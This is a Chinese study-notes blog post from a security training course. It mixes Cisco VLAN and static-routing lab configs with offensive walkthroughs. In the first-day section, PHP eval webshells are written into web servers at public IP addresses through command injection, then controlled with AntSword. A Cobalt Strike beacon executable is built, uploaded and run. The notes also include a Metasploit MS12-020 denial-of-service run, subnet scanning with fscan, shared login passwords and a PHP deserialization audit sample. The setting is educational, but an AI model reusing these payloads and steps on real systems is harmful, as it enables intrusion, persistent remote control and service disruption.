+<p><strong>注意带时间的是日志不用管</strong></p>
+<p>Router(config)#<strong>int Gig0&#x2F;0.10</strong></p>
+<p>Router(config-subif)#<strong>encapsulation dot1Q 10</strong></p>
+<p>Router(config-subif)#<strong>ip address 192.168.10.254 255.255.255.0</strong></p>
+<p>Router(config-subif)#<strong>ex</strong></p>
+<p>Router(config)#<strong>ip dhcp pool vlan10</strong></p>
+<p>Router(dhcp-config)#<strong>network 192.168.10.0 255.255.255.0</strong></p>
+<p>Router(dhcp-config)#<strong>default-router 192.168.10.254</strong></p>
+<p>Router(dhcp-config)#<strong>dns</strong>     <strong>输入Tab键会自动补足</strong></p>
+<p>Router(dhcp-config)#<strong>dns-server 8.8.8.8</strong></p>
+<p>Router(dhcp-config)#<strong>ex</strong></p>
+<p>接下来对交换机进行配置 拔出线 重新接到交换机上的Console接口</p>
+<p>小闪电 同上操作</p>
+<p>注意 配置两个接口，用两个不同协议 交换机与路由器一端Truck 交换机与PC端Access</p>
+<p>SW(config)#ylan 10   创建ylan10<br>SW(config-vlan)#ex</p>
+<p>access :<br>SW(config-if)#int f0&#x2F;2<br>SW(config-if)#switchport mode access  将接口配置为Access口<br>SW(config-if)#switchport access vlan 10 将接口与VLAN 10 进行关联<br>SW(config-if)#ex</p>
+<p>Trunk:<br>SW(config)#int f0&#x2F;1<br>SW(config-if)#switchport trunk encapsulation dot1Q 进行数据包封装<br>SW(config-if)#switchport mode trunk   将接口配置为Trunk口<br>SW(config-if)#switchport trunk allowed vlan all  运行所有vlan通过</p>
+<p>实操</p>
+<p>Switch&gt;<strong>show interfaces</strong></p>
+<p>……………………..</p>
+<p>Switch&gt;<strong>en</strong></p>
+<p>Switch#<strong>config</strong></p>
+<p>Configuring from terminal, memory, or network [terminal]? </p>
+<p>Enter configuration commands, one per line.  End with CNTL&#x2F;Z.</p>
+<p>Switch(config)#<strong>vlan 10</strong></p>
+<p>Switch(config-vlan)#<strong>ex</strong></p>
+<p>Switch(config)#<strong>int Fa0&#x2F;1</strong></p>
+<p>Switch(config-if)#<strong>sw</strong></p>
+<p>Switch(config-if)#<strong>switchport tr</strong></p>
+<p>Switch(config-if)#<strong>switchport trunk encapsulation dot1Q</strong></p>
+<p>Switch(config-if)#<strong>switchport mode trunk</strong></p>
+<p>Switch(config-if)#<strong>switchport trunk allowed vlan all</strong></p>
+<p>Switch(config-if)#<strong>ex</strong></p>
+<p>Switch(config)#<strong>int Fa0&#x2F;2</strong></p>
+<p>Switch(config-if)#<strong>switchport mode access</strong> </p>
+<p>Switch(config-if)#<strong>switchport access vlan 10</strong></p>
+<p>Switch(config-if)#<strong>ex</strong></p>
+<p>配置完成后拆下线，PC端连接交换机配置Access的端口 关掉电脑网络 ipconfig查看是否成功 </p>
+<h3 id="总结深华"><a href="#总结深华" class="headerlink" title="总结深华"></a>总结深华</h3><h4 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h4><p>注意一个思路：使用逻辑漏洞，用burp抓包，将支付金额修改为0</p>
+<p>试点网站：<a target="_blank" rel="noopener" href="https://navicat.com.cn/">https://navicat.com.cn/</a></p>
+<p>第一点：</p>
+<p>rce：命令执行漏洞</p>
+<p>pwd：查看路径</p>
+<p>ls:列出目录下文件</p>
+<p>认识echo: (写入文件)</p>
+<p>echo XXXX 直接打印出来</p>
+<p>echo XXXX &gt;YY.CC打印到YY.CC (YY.CC不存在会自动生成)</p>
+<?php eval(); ?>
+
+<p>eval() 可以接收一个参数</p>
+<p>cat whl.php  输出whl.php的内容</p>
+<p>网站：<a target="_blank" rel="noopener" href="http://140.143.147.109:32848/">http://140.143.147.109:32848/</a></p>
+<p>在输入框中输入：echo ‘<?php eval($_POST[123]); ?>‘  &gt; whl.php (注意这里存在过滤所以用单引号)</p>
+<p><a target="_blank" rel="noopener" href="http://140.143.147.109:32848/search/index.phplang=cn&stype=0&searchword=echo+%27">http://140.143.147.109:32848/search/index.phplang=cn&amp;stype=0&amp;searchword=echo+%27</a>&lt;%3Fphp+eval%28%24_POST%5B123%5D%29%3B+%3F&gt;%27++&gt;+whl.php</p>
+<p><a target="_blank" rel="noopener" href="http://140.143.147.109:32848/search/index.php?lang=cn&stype=0&searchword=ls">http://140.143.147.109:32848/search/index.php?lang=cn&amp;stype=0&amp;searchword=ls</a>      查看目录：发现木马植入</p>
+<p><a target="_blank" rel="noopener" href="http://140.143.147.109:32848/search/index.php?lang=cn&stype=0&searchword=pwd">http://140.143.147.109:32848/search/index.php?lang=cn&amp;stype=0&amp;searchword=pwd</a> 查看路径：&#x2F;var&#x2F;www&#x2F;html&#x2F;search  (html后面的才可以)</p>
+<p>蚁剑连接：<a target="_blank" rel="noopener" href="http://140.143.147.109:32848/search/whl.php">http://140.143.147.109:32848/search/whl.php</a> 密码：123 </p>
+<p>第二点</p>
+<p>网站：<a target="_blank" rel="noopener" href="http://192.168.4.210/">http://192.168.4.210</a> (需使用公司内网)</p>
+<p>公司内网：使用贝锐蒲公英连接</p>
+<p>账号：25914236:042 25914236:049 25914236:053 25914236:042</p>
+<p>密码：Aa123456</p>
+<p>该网站–点击Help–点击help–点击testPage</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.4.210/help.php?file=help/page/test.php&&code=phpinfo()">http://192.168.4.210/help.php?file=help/page/test.php&amp;&amp;code=phpinfo()</a>;</p>
+<p>phpinfo() php的一个参数–返回页面内容为当前的php版本信息</p>
+<p>代表此处可以传入PHP代码</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.4.210/help.php?file=help/page/test.php&&code=eval($_POST%5B123%5D)">http://192.168.4.210/help.php?file=help/page/test.php&amp;&amp;code=eval($_POST[123])</a>;</p>
+<p>然后蚁剑连接<a target="_blank" rel="noopener" href="http://192.168.4.210/help.php?file=help/page/test.php&&code=eval($_POST%5B123%5D)">http://192.168.4.210/help.php?file=help/page/test.php&amp;&amp;code=eval($_POST[123])</a>;      123</p>
+<p>总结传入一句话木马为</p>
+<p>1，传入文件</p>
+<p>2，rce：命令执行漏洞</p>
+<p>3，通过参数传入</p>
+<p>第三点</p>
+<p>kali（服务端）–本机（客户端）–win7</p>
+<p>kali:</p>
+<p>cobaltstrik下打开控制台 （Open Terminal Here）</p>
+<p>ifconfig 得到IP 192.168.112.128</p>
+<p>ls ：</p>
+<p>agscript  cobaltstrike.auth  CobaltStrikeCN.jar  cobaltstrike.store  <em><strong>cs.bat</strong></em>  data      keytool.exe   libicmp.so          libtapmanager.so  peclone  <em><strong>teamserver</strong></em>      third-party<br>c2lint    cobaltstrike.bat   cobaltstrike.jar    crackInfo.txt       cs.sh   icon.jpg  libicmp64.so  libtapmanager64.so  logs              Scripts  teamserver.bat  手册</p>
+<p>chmod 777 teamserver    （注意：任何外来工具都要这样获取权限；777为最高权限 chmod:更改文件权限）</p>
+<p>sudo .&#x2F;teamserver 192.168.112.128 123123  （sudo 提权）</p>
+<p>123123为你随便设的密码 回车后输入Kali密码kali在回车</p>
+<p>切回本机:</p>
+<p>打开cobaltstrik下的cs.bat  注意关闭电脑的防火墙与杀毒</p>
+<p>输入对应参数 192.168.112.128  123123</p>
+<p>监听（耳机图标）—-Add—-HTTP Hosts 添加192.168.112.128 —HTTP port(C2) 8082 随便设置一个未被使用的窗口–save    （好像）</p>
+<p>攻击—生成后门—第四个（Windows Executable）–选择刚刚生成的监听器–勾选使用x64攻击载荷–生成.exe程序–打开启动小皮—将该程序放在小皮的根目录</p>
+<p>打开win7—游览器—输入访问<a target="_blank" rel="noopener" href="http://192.168.112.1/artifact.exe">http://192.168.112.1/artifact.exe</a> 小皮IP加程序名—下载</p>
+<p>（注意用 192.168.157.1好像不行 好像HTTP Hosts(Stager)也要和HTTP Hosts一样 ）</p>
+<p>查看本机状态判断成功—右键进入beacon 在最下方可以输入</p>
+<p>第四点</p>
+<p>cs.bat连接到老师公网 58.87.103.109  123123  —用第三点生成XXX.exe文件—在第二点下用蚁剑将XXX.exe文件上传—用蚁剑打开虚拟终端直接输入XXX.exe—回车</p>
+<p>注意上传的路径与终端打开的路径要一致</p>
+<p>第五点</p>
+<p>ping 127.0.0.1 | ls  （ 管道符|：两个命名一起执行 不用空格隔开）</p>
+<p>网站：<a target="_blank" rel="noopener" href="https://120.71.174.251:888/index.php">https://120.71.174.251:888/index.php</a>  账号：admin  hicomadmin</p>
+<p>网站中寻找突破口—例如ping窗口—127.0.0.1|ls  </p>
+<p>&#x3D;&#x3D;》后端：ping 127.0.0.1|ls 所以不能有ls|127.0.0.1</p>
+<p>127.0.0.1|pwd  &#x3D;&#x3D;》&#x2F;usr&#x2F;infoserv&#x2F;www</p>
+<p>所以可输入一句话木马然后蚁剑</p>
+<p>127.0.0.1|echo “<?php eval($_POST[123])?>“ &gt; &#x2F;usr&#x2F;infoserv&#x2F;www&#x2F;whl.php</p>
+<p>127.0.0.1|echo ‘<?php eval($_POST[123])?>‘ &gt; &#x2F;usr&#x2F;infoserv&#x2F;www&#x2F;whl.php</p>
+<p>echo ‘<?php eval($_POST[123])?>‘ &gt; whl.php  </p>
+<p>???????</p>
+<p>发现有输入限制—-抓包</p>
+<p>第六点</p>
+<p>复习<strong>msfconsole</strong></p>
+<p>永恒之蓝 ms17-010–见前面第四课</p>
+<p>蓝屏 ms12-020：</p>
+<p>不需要永恒之蓝那样的接收</p>
+<p><strong>msfconsole</strong></p>
+<p><strong>search ms12-020</strong></p>
+<p>0  auxiliary&#x2F;scanner&#x2F;rdp&#x2F;ms12_020_check                          normal  Yes    MS12-020 Microsoft Remote Desktop Checker<br>1  auxiliary&#x2F;dos&#x2F;windows&#x2F;rdp&#x2F;ms12_020_maxchannelids  2012-03-16    normal  No   MS12-020 Microsoft Remote Desktop Use-After-Free DoS</p>
+<p>观察0不行check(只有检查功能)，1才可以2012-03-16</p>
+<p><strong>use 1</strong></p>
+<p><strong>show options</strong>     不用设置攻击载荷</p>
+<p>RHOSTS                   yes       The target host(s), see <a target="_blank" rel="noopener" href="https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.htmlRPORT">https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.htmlRPORT</a>   3389             yes       The target port (TCP)</p>
+<p><strong>set rhosts 192.168.112.129</strong>  （win7的IP地址）</p>
+<p><strong>run</strong></p>
+<p>实际中有个问题，如何知道win7的IP地址</p>
+<p>使用fscan（kali中）–进行网段设备扫描  </p>
+<p>在fscan中打开控制台（连接着同个WiFi在同个网段里）</p>
+<p>ls</p>
+<p>fscan  ‘fscan64 (1).exe’   fscan_amd64   fscan_arm   result.txt   url.txt</p>
+<p><strong>chmod 777 fscan</strong> </p>
+<p><strong>.&#x2F;fscan_amd64 -h 192.168.112.0&#x2F;24</strong>  注意在这里使用的是fscan_amd64</p>
+<p>start infoscan<br>trying RunIcmp2<br>The current user permissions unable to send icmp packets<br>start ping<br>(icmp) Target 192.168.112.1   is alive<br>(icmp) Target 192.168.112.2   is alive<br>(icmp) Target 192.168.112.128 is alive<br>(icmp) Target 192.168.112.129 is alive<br>[<em>] Icmp alive hosts len is: 4<br>192.168.112.1:7680 open<br>192.168.112.1:135 open<br>192.168.112.129:135 open<br>192.168.112.1:139 open<br>192.168.112.129:139 open<br>192.168.112.1:445 open<br>192.168.112.129:445 open<br>192.168.112.1:10000 open<br>[</em>] alive ports len is: 8<br>start vulscan<br>[<em>] NetInfo:<br>[</em>]192.168.112.1<br>   [-&gt;]wm���s192.168.112.1<br>   [-&gt;]192.168.157.1<br>   [-&gt;]10.39.133.218<br>   [-&gt;]172.16.4.13<br>[<em>] NetInfo:<br>[</em>]192.168.112.129<br>   [-&gt;]<strong>Whl-PC</strong><br>   [-&gt;]<strong>192.168.112.129</strong><br>[<em>] WebTitle: <a target="_blank" rel="noopener" href="http://192.168.112.1:10000/">http://192.168.112.1:10000</a> code:404 len:19     title:None<br>[</em>] 192.168.112.129  (Windows 7 Ultimate 7601 Service Pack 1)<br>已完成 8&#x2F;8<br>[*] 扫描结束,耗时: 9.019676258s</p>
+<h4 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h4><p>ip地址：三点分十进制    c类私有地址：192.168.0.0 -192.168.255.255</p>
+<p>子网掩码：255.255.255.0   24位掩码</p>
+<p>网段：192.168.1.0&#x2F;24 表示IP地址192.168.1.0和子网掩码255.255.255.0，其中24表示子网掩码中有24个连续的1。</p>
+<p>Router#show ip route 查询路由表</p>
+<p>路由类型：直连路由 、静态路由 、动态路由</p>
+<p>路由表：存储路由条目 C–直连 S–静态</p>
+<p>静态路由：手动指定  实现不同网段之间的通信</p>
+<p>Router#show ip interface brief 查询接口IP地址</p>
+<p>如果在全局配置模式下查询命令加上do</p>
+<p>例如do show ip route</p>
+<p>Router&gt; 用户模式 ：不能去ip地址，协议 基本查询<br>    Router&gt;enable  进入到特权模式<br>Router# 特权模式 ：不能做配置，但是能实现完整查询功能</p>
+<p>Router#configure  terminal 	进入到全局配置模式</p>
+<p>Router(config)#interface fastEthernet 0&#x2F;0 &#x2F;&#x2F;进入对应接口<br>Router(config-if)#  &#x2F;&#x2F;接口视图</p>
+<p>Router(config-if)#ip address 192.168.1.1 255.255.255.0 &#x2F;&#x2F;配置ip地址<br>Router(config-if)#no shutdown  &#x2F;&#x2F;开启接口</p>
+<p>Router#ping 192.168.1.2 &#x2F;&#x2F;测试连通性</p>
+<p>静态路由：</p>
+<pre><code>R3(config)#ip route 192.168.1.0 255.255.255.0 192.168.2.1
+    192.168.1.0 //目标范围
+    255.255.255.0 //掩码
+    192.168.2.1 //下一跳出接口地址
+</code></pre>
+<p>Router(config)#hostname  XX &#x2F;&#x2F;修改设备名称</p>
+<p>loopback 虚拟环回口   作用：测试非直连连通性，标识<br>R1(config)#interface  loopback  0  &#x2F;&#x2F;进入loopback 接口上 0为你随机设置的名称<br>R1(config-if)#ip address 1.1.1.1 255.255.255.0</p>
+<p><strong>静态路由的应用</strong></p>
+<p>实验配置</p>
+<ol>
+<li><p>参照拓扑结构，使用合适的线缆对路由器和交换机完成拓扑的搭建</p>
+</li>
+<li><p>完成各路由器的设备名和 IP 地址的基本配置，实现各设备直连链路之间可以互 ping，</p>
+</li>
+</ol>
+<p>各路由器的直连接口地址自行规划</p>
+<ol start="3">
+<li><p>在路由器 R1、路由器 R2 和路由器 R3 上各新增一个 Loopback 接口，模拟各 LAN所在的主机，自行规划 LAN1 、 LAN2 和 LAN3 所在网段的地址</p>
+</li>
+<li><p>在路由器 R1 上创建两条分别到达 LAN2 、 LAN3 所在网段的静态路由</p>
+</li>
+<li><p>在路由器 R2 上创建两条分别到达 LAN1 、 LAN3 所在网段的静态路由</p>
+</li>
+<li><p>在路由器 R3 上创建两条分别到达 LAN1 、 LAN2 所在网段的静态路由</p>
+</li>
+<li><p>使用 ping 命令测试 LAN1 、 LAN2 、 LAN3 主机之间的连通性</p>
+</li>
+<li><p>观察 R1、R2、R3 的路由表，比较不同路由表的内容，并分析 LAN1 分别访问 LAN2、</p>
+</li>
+</ol>
+<p>LAN3 的数据通信过程</p>
+<ol start="9">
+<li>完成相关配置，使 R4主机去访问 LAN1 时实现链路备份，当R2与R4相连链路故障时能够切换另外的一条线路进行通信</li>
+</ol>
+<p>实验需求</p>
+<ol>
+<li>ip地址配置</li>
+</ol>
+<p>Router&gt;en</p>
+<p>Router#config</p>
+<p>Router(config)#hostname R2</p>
+<p>R2(config)#interface fastEthernet 0&#x2F;0</p>
+<p>R2(config-if)#ip address 192.168.12.2 255.255.255.0</p>
+<p>R2(config-if)#no shutdown</p>
+<p>R2(config-if)#exit</p>
+<p>R2(config)#interface fastEthernet 0&#x2F;1</p>
+<p>R2(config-if)#ip address 192.168.24.2 255.255.255.0</p>
+<p>R2(config-if)#no shutdown</p>
+<p>R1 R3 R4同</p>
+<p>R2(config-if)#</p>
+<p>R2(config)#ip route 192.168.13.0 255.255.255.0 192.168.12.1</p>
+<p>R2(config)#ip route 192.168.34.0 255.255.255.0 192.168.24.4</p>
+<p>R2(config)#exit</p>
+<p>R1 R3 R4 同</p>
+<p>Ping测试成功</p>
+<ol start="2">
+<li>环回口配置</li>
+</ol>
+<p>R1(config)#interface loopback 0</p>
+<p>R1(config-if)#ip address 1.1.1.1 255.255.255.0</p>
+<p>R2 R3 同</p>
+<ol start="3">
+<li>在路由器 R1 上创建两条分别到达 LAN2 、 LAN3 所在网段的静态路由</li>
+</ol>
+<p>R1(config)#ip route 2.2.2.0 255.255.255.0 192.168.12.2</p>
+<p>R1(config)#ip route 3.3.3.0 255.255.255.0 192.168.13.3</p>
+<ol start="4">
+<li>在路由器 R2 上创建两条分别到达 LAN1 、 LAN3 所在网段的静态路由</li>
+</ol>
+<p>R2(config)#ip route 3.3.3.0 255.255.255.0 192.168.12.1</p>
+<p>R2(config)#ip route 1.1.1.0 255.255.255.0 192.168.12.1</p>
+<ol start="5">
+<li>在路由器 R3 上创建两条分别到达 LAN1 、 LAN2 所在网段的静态路由</li>
+</ol>
+<p>R3(config)#ip route 1.1.1.0 255.255.255.0 192.168.13.1</p>
+<p>R3(config)#ip route 2.2.2.0 255.255.255.0 192.168.13.1</p>
+<ol start="8">
+<li>完成相关配置，使 R4主机去访问 LAN1 时实现链路备份，当R2与R4相连链路故障时能够切换另外的一条线路进行通信</li>
+</ol>
+<p>R4(config)#ip route 1.1.1.0 255.255.255.0 192.168.24.2</p>
+<p>R4(config)#ip route 1.1.1.0 255.255.255.0 192.168.34.3</p>
+<p>实验测试</p>
+<p>使用 ping 命令测试 LAN1 、 LAN2 、 LAN3 主机之间的连通性</p>
+<p>发现R1可ping 2.2.2.2 与3.3.3.3 R2 R3可ping 1.1.1.1 R2也可ping 3.3.3.3 R3也可ping 2.2.2.2</p>
+<p>链路备份 R4测试LAN1 ，断开与R2相连接的链路后测试连通性</p>
+<p>shoudown &#x3D;&#x3D;》R4 ping 1.1.1.1</p>
+<p>2&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;》3<br>ping 数据包<br>源IP：192.168.12.2<br>目标IP：3.3.3.3<br>原IP可通（via）(查看路由表）<br>相反的<br>源IP：3.3.3.3<br>目标IP：192.168.12.2<br>回程也必须可via</p>
+<h4 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h4><p>代码审计</p>
+<?php
+class Modifier{
+    public $var;   //flag.php
+    public function append ($value) {
+        include($value); //文件包含，文件的文件名就是我们传入的参数
+        echo $flag;}
+    public function __invoke(){   //当这个类以函数方式调用对象时被调用
+        $this->append ($this->var); }}
+class Show{
+    public $source;//$str=new test()
+    public $str;
+    public function __toString(){ //当一个类被转换成字符串时被调用
+        return (string)$this->str->source;}//$this->test().source
+    public function __wakeup(){  //当使用unserialize时被调用，可用于做些对象的初始化操作
+        echo $this->source;}}//$source=new show()，打印一个字符串
+class Test{
+    public $p; 
+    public function __construct(){  //constuct构建对象的时被调用；
+        $this->p = array(); }
+    public function __get($key){   //get读取不可访问或不存在属性时被调用
+        $function = $this->p;       //$function="modifier"
+        return $function(); }}   
+if(isset($_GET['pop'])){
+    unserialize($_GET['pop']);}
+?>
+
+
+
+
+
+<?php
+
+class S{
+
+var $test ="whl";
+
+function _destruct(){
+
+echo $this->test;
+
+}
+
+}
+
+$s = new S();
+
+echo serialize($s);
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://WH-dragon.github.io">WH-dragon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://wh-dragon.github.io/2024/10/14/%E6%9F%90%E6%AC%A1%E6%AF%94%E8%B5%9B%E8%8D%89%E7%8E%87%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">http://wh-dragon.github.io/2024/10/14/某次比赛草率的学习笔记/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://WH-dragon.github.io" target="_blank">WH-dragon的荒岛</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0/">学习</a></div><div class="post_share"><div class="social-share" data-image="/img/%E5%A4%B4%E5%83%8F.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/16/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90&amp;%E4%BC%A0%E8%BE%93%E5%8A%A0%E5%AF%86&amp;%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F&amp;%E5%AF%86%E6%96%87%E5%AD%98%E5%82%A8&amp;%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86&amp;%E9%80%86%E5%90%91%E4%BF%9D%E6%8A%A4/" title="网安入门-算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网安入门-算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/14/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF&amp;%E5%85%B6%E5%AE%83%E5%8D%8F%E8%AE%AE/" title="网安入门-抓包技术&amp;其它协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">网安入门-抓包技术&amp;其它协议</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/27/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-Web%E6%9E%B6%E6%9E%84/" title="网安入门-Web架构"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">网安入门-Web架构</div></div></a></div><div><a href="/2024/09/27/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-APP%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%9E%B6%E6%9E%84/" title="网安入门-APP与小程序架构"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">网安入门-APP与小程序架构</div></div></a></div><div><a href="/2024/09/28/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%BC%B9%20SHELL&%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%A6%E5%A4%96&%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5&%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99&%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" title="网安入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-28</div><div class="title">网安入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</div></div></a></div><div><a href="/2024/10/14/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF&%E5%85%B6%E5%AE%83%E5%8D%8F%E8%AE%AE/" title="网安入门-抓包技术&amp;其它协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-14</div><div class="title">网安入门-抓包技术&amp;其它协议</div></div></a></div><div><a href="/2024/10/11/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF&HTTPS/" title="网安入门-抓包技术&amp;HTTPS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-11</div><div class="title">网安入门-抓包技术&amp;HTTPS</div></div></a></div><div><a href="/2024/10/16/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90&%E4%BC%A0%E8%BE%93%E5%8A%A0%E5%AF%86&%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F&%E5%AF%86%E6%96%87%E5%AD%98%E5%82%A8&%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86&%E9%80%86%E5%90%91%E4%BF%9D%E6%8A%A4/" title="网安入门-算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-16</div><div class="title">网安入门-算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%90%E6%AC%A1%E6%AF%94%E8%B5%9B%E8%8D%89%E7%8E%87%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-text">某次比赛草率的学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%9Asqlmap%E7%88%86%E7%A0%B4"><span class="toc-text">第一课：sqlmap爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E8%AF%BE%EF%BC%9A%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">第二课：手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E8%AF%BE%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">第三课：文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E8%AF%BE%EF%BC%9A%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-text">第四课：永恒之蓝</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%9A%E8%B7%AF%E7%94%B1%E5%AE%9E%E9%AA%8C"><span class="toc-text">第五课：路由实验</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E6%B7%B1%E5%8D%8E"><span class="toc-text">总结深华</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A4%A9"><span class="toc-text">第一天</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%A9"><span class="toc-text">第二天</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%A4%A9"><span class="toc-text">第三天</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By WH-dragon</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi! Welcome TO My Blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div 